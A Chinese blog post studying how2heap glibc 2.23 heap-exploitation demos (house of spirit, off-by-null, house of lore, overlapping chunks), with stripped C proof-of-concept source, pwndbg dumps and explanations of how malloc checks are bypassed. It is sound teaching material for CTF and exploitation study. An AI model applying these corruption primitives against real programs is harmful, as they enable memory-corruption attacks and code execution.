<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="how2heap, StarrySky">
    <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>how2heap | StarrySky</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="StarrySky" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">StarrySky</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>文章</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>个人简介</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">StarrySky</div>
        <div class="logo-desc">
            
            Love rises from the east and descends to the west,romance makes no changes until death.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			文章
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			个人简介
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/Steel%20Gray.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">how2heap</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/heap/">
                                <span class="chip bg-color">heap</span>
                            </a>
                        
                            <a href="/tags/pwn/">
                                <span class="chip bg-color">pwn</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/heap/" class="post-category">
                                heap
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-09-24
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-10-19
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    16k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    85 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><code>how2heap</code>源码地址：<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/tree/master">https://github.com/shellphish/how2heap/tree/master</a></p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a></p>
<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/19609dd.html">https://zikh26.github.io/posts/19609dd.html</a></p>
<p>本篇去除了所有注释（太占地方啦</p>
<h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

void main() &#123;
	void* p1 &#x3D; calloc(1,0x40);
	free(p1);
	void* p3 &#x3D; malloc(0x400);
    
    assert(p1 &#x3D;&#x3D; p3);

	free(p1);
	void *p4 &#x3D; malloc(0x400);

	assert(p4 &#x3D;&#x3D; p3);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>p1</code>被释放进入<code>fastbin</code>之后创建大小属于<code>large bin</code>的堆<code>p3</code>，判断完<code>p3</code>不属于<code>fastbin</code>和<code>small bin</code>之后进行<code>malloc consolidate</code>将<code>p1</code>整理到<code>unsorted bin</code>，又被合并到<code>top chunk</code>,在申请堆<code>p3</code>时就从<code>top chunk</code>取的堆，所以<code>p3</code>和<code>p1</code>地址相同，而此时<code>chunk1</code>地址成为了<code>chunk3</code>的地址，再次释放<code>chunk1</code>释放的就是<code>chunk3</code>，再申请与<code>chunk3</code>大小相同的堆时申请到的就是<code>chunk3</code>地址，因此<code>p4 = p3</code>且两个指针都未置零，因为释放的是<code>p1</code></p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
&#123;
        malloc(1);
    
        unsigned long long *a;
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
    
        fake_chunks[1] &#x3D; 0x40; 
        fake_chunks[9] &#x3D; 0x1234; 
    
        a &#x3D; &amp;fake_chunks[2];
    
        free(a);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈中取了一个地址布置<code>fake_chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1b0
0x7fffffffe1b0: 0x0000000000000001      0x0000000000000040	#size
0x7fffffffe1c0: 0x00007ffff7ffe168      0x00000000000000f0
0x7fffffffe1d0: 0x00000000000000c2      0x000055555555542d
0x7fffffffe1e0: 0x00007fffffffe20e      0x0000000000000000
0x7fffffffe1f0: 0x00005555555553e0      0x0000000000001234	#next size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>伪造成功即可释放<code>fake_chunk</code>到<code>bin</code>，其中<code>free</code>的地址是<code>user data</code>地址</p>
<h3 id="poison-null-byte-x2F-off-by-null"><a href="#poison-null-byte-x2F-off-by-null" class="headerlink" title="poison_null_byte&#x2F;off-by-null"></a>poison_null_byte&#x2F;off-by-null</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;


int main()
&#123;
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        void *barrier;

        a &#x3D; (uint8_t*) malloc(0x100);
        int real_a_size &#x3D; malloc_usable_size(a);
    
        b &#x3D; (uint8_t*) malloc(0x200);
        c &#x3D; (uint8_t*) malloc(0x100);
    
        barrier &#x3D;  malloc(0x100);
    
        uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);

        *(size_t*)(b+0x1f0) &#x3D; 0x200;

        free(b);

        a[real_a_size] &#x3D; 0; 
    
        uint64_t* c_prev_size_ptr &#x3D; ((uint64_t*)c)-2;
    
        b1 &#x3D; malloc(0x100);
        b2 &#x3D; malloc(0x80);

        memset(b2,&#39;B&#39;,0x80);
    
        free(b1);
        free(c);
    
        d &#x3D; malloc(0x300);
    
        memset(d,&#39;D&#39;,0x300);
    
        assert(strstr(b2, &quot;DDDDDDDDDDDD&quot;));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>条件</strong>：没有<code>tcache</code>且有<code>off-by-one</code>漏洞</p>
<p>首先创建了四个堆，其中<code>barrier</code>是为了防止释放<code>c</code>时与<code>top chunk</code>合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000			#a
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110			#b
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x55555555c320			#c
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c430			#barrier
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将堆<code>b</code>的末尾伪造成<code>next_chunk</code>的<code>prev_size</code>，使得通过<code>off-by-null</code>修改<code>b</code>的<code>size</code>的后两位为<code>0</code>之后依然能够绕过<code>size = prve_size(next_chunk)</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000200      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>释放堆<code>b</code>并通过<code>off-by-null</code>将<code>b</code>的大小改成<code>0x200</code>，此时<code>c</code>被识别到伪造的<code>next_chunk</code>处，由于没有修改<code>size</code>位所以<code>size</code>为<code>0</code>，但已经绕过了检查</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin)
Addr: 0x55555555c110
Size: 0x200
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0x100</code>的堆<code>b1</code>和一个<code>0x80</code>的堆<code>b2</code>,此时堆从<code>unsorted bin</code>中分割，地址在刚刚释放的<code>b</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c110
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555c220
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c2b0
Size: 0x61
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c310
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>且真实的<code>c</code>的<code>prve_size</code>没有更新，而是更新了伪造的<code>prve_size</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x55555555c310: 0x0000000000000060      0x0000000000000000
0x55555555c320: 0x0000000000000210      0x0000000000000110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>此时释放<code>b1</code>和<code>c</code>，会将<code>b1</code>和<code>c</code>合并成一个覆盖<code>b2</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555c110
Size: 0x321
fd: 0x55555555c2b0
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555c430
Size: 0x110

Top chunk | PREV_INUSE
Addr: 0x55555555c540
Size: 0x20ac1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时将合并的堆申请出来就能实现<code>overlap</code>，即申请的空间覆盖了<code>b2</code></p>
<h3 id="house-of-lore-x2F-small-bin"><a href="#house-of-lore-x2F-small-bin" class="headerlink" title="house_of_lore&#x2F;small bin"></a>house_of_lore&#x2F;small bin</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;

int main(int argc, char * argv[])&#123;

  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;
  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;

  intptr_t *victim &#x3D; malloc(0x100);
  intptr_t *victim_chunk &#x3D; victim-2;
    
  stack_buffer_1[0] &#x3D; 0;
  stack_buffer_1[1] &#x3D; 0;
  stack_buffer_1[2] &#x3D; victim_chunk;

  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;

  void *p5 &#x3D; malloc(1000);
 
  free((void*)victim);

  void *p2 &#x3D; malloc(1200);

  victim[1] &#x3D; (intptr_t)stack_buffer_1;

  void *p3 &#x3D; malloc(0x100);
  char *p4 &#x3D; malloc(0x100);
    
  intptr_t sc &#x3D; (intptr_t)jackpot; 
  memcpy((p4+40), &amp;sc, 8);

  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>small bin</code>之后在栈上伪造以该堆为起点的链，包含两个<code>fake chunk</code>,伪造过程即修改三个堆的<code>fd</code>和<code>bk</code>区域的位置，这样就可以绕过<code>small bin</code> 对<code>fd</code>以及需要申请的<code>fake chunk</code>不能在<code>small bin</code>链的尾部的检查，申请相同大小的堆即可将<code>fake chunk</code>申请出来。</p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)
        &#123;
          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;
            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C" data-language="C"><code class="language-C">else
           &#123;
             bck &#x3D; victim-&gt;bk;
if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))
               &#123;
                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;
                 goto errout;
               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从<code>small bin</code> 申请堆的时候会判断最后一个堆的<code>bk</code>指向的堆的<code>fd</code>是否是该堆，因此在需要申请的位置后面还要再伪造一个堆</p>
<p>创建两个堆（第二个防止合并），并且在栈上伪造一个链表</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x55555555b110
Size: 0x3f1

Top chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x20b01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd60
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x000055555555b000	0x00007fffffffdd40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x00007fffffffdd40
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x00007fffffffdd60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>释放第一个堆并且再次创建一个堆使其进入<code>small bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111
fd: 0x7ffff7dd1c78
bk: 0x7ffff7dd1c78

Allocated chunk
Addr: 0x55555555b110
Size: 0x3f0

Allocated chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x55555555b9c0
Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改堆的<code>bk</code>为栈上伪造的堆的地址，第二次申请即可得到栈上的地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x55555555b000
Size: 0x111
fd: 0x7ffff7dd1c78
bk: 0x7fffffffdd60

Allocated chunk | PREV_INUSE
Addr: 0x55555555b110
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b500
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x55555555b9c0
Size: 0x20641<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

int main(int argc , char* argv[])&#123;


	intptr_t *p1,*p2,*p3,*p4;

	p1 &#x3D; malloc(0x100 - 8);
	p2 &#x3D; malloc(0x100 - 8);
	p3 &#x3D; malloc(0x80 - 8);

	memset(p1, &#39;1&#39;, 0x100 - 8);
	memset(p2, &#39;2&#39;, 0x100 - 8);
	memset(p3, &#39;3&#39;, 0x80 - 8);

    free(p2);

	int evil_chunk_size &#x3D; 0x181;
	int evil_region_size &#x3D; 0x180 - 8;

	*(p2-1) &#x3D; evil_chunk_size; 
    
	p4 &#x3D; malloc(evil_region_size);
    
	memset(p4, &#39;4&#39;, evil_region_size);
	memset(p3, &#39;3&#39;, 80);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个实际大小为<code>0x101</code>的堆和一个<code>0x81</code>的堆，释放第二个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x101
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555b200
Size: 0x80

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将被释放的堆的大小改成第二、三个堆的大小之和， 此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将该堆申请出来即可实现<code>overlap</code>,即申请的堆包含了初始的第三个堆且可向其写入数据</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x55555555b100
Size: 0x181

Top chunk | PREV_INUSE
Addr: 0x55555555b280
Size: 0x20d81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实现效果：存在两个堆，使得上一个堆覆盖到下一个堆</p>
<h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()&#123;
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use &#x3D; 0x1;

  p1 &#x3D; malloc(1000);
  p2 &#x3D; malloc(1000);
  p3 &#x3D; malloc(1000);
  p4 &#x3D; malloc(1000);
  p5 &#x3D; malloc(1000);

  real_size_p1 &#x3D; malloc_usable_size(p1);
  real_size_p2 &#x3D; malloc_usable_size(p2);
  real_size_p3 &#x3D; malloc_usable_size(p3);
  real_size_p4 &#x3D; malloc_usable_size(p4);
  real_size_p5 &#x3D; malloc_usable_size(p5);

  memset(p1,&#39;A&#39;,real_size_p1);
  memset(p2,&#39;B&#39;,real_size_p2);
  memset(p3,&#39;C&#39;,real_size_p3);
  memset(p4,&#39;D&#39;,real_size_p4);
  memset(p5,&#39;E&#39;,real_size_p5);

  free(p4);

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) &#x3D; real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;

  free(p2);

  p6 &#x3D; malloc(2000);
  real_size_p6 &#x3D; malloc_usable_size(p6);

  memset(p6,&#39;F&#39;,1500);  
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建5个堆，释放第四个堆，将第二个堆的大小改成二三两个堆大小之和，此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆并申请回来，此时第二、三、四个堆会被合并成一个堆</p>
